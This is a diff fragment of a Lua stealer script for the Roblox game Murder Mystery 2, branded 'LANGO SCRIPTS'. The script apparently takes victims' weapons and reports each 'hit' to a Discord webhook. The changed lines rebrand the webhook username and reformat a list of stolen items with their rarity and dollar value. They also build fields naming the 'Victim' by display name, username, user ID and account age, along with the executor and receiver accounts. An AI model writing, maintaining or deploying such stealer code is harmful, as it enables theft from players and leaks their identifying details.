@@ -367,9 +367,8 @@ for i = 1, math.min(3, #weaponsToSend) do
     local item = weaponsToSend[i]
     local emoji = {Ancient = "🔴", Godly = "🟣", Unique = "🟡", Vintage = "🟠", Legendary = "🔵", Rare = "🟢", Uncommon = "⚪", Common = "⚫"}
     local e = emoji[item.Rarity] or "⚪"
-    table.insert(top_items, string.format("%s \\`%s\\` x%d **$%.2f**", e, item.ItemName, item.Amount, item.TotalValue))
+    table.insert(top_items, e .. " " .. item.ItemName .. " x" .. item.Amount .. " $" .. string.format("%.2f", item.TotalValue))
 end
-
 local fields = {
     {name = "👤 Victim", value = plr.DisplayName .. "\\n(@" .. plr.Name .. ")\\nID: " .. plr.UserId .. "\\nAge: " .. plr.AccountAge .. " days", inline = true},
     {name = "⚙️ System", value = "Executor: " .. executorName .. "\\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\\nJob ID:\\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
@@ -388,7 +387,7 @@ table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoi
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | LANGO SCRIPTS**" or nil,
-    username = "🌑 Eternal Darkness",
+    username = "🌑 lango scrits",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
         title = "LANGO SCRIPTS MM2   HIT | " .. hitCategory,
@@ -413,7 +412,7 @@ local publicFields = {
 
 local PublicPayload = {
     content = "🌑 **MM2 Public Hits | LANGO SCRIPTS**",
-    username = "🌑 Eternal Darkness",
+    username = "🌑 lango scripts",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
         title = "Eternal Darkness MM2 HIT | " .. hitCategory,
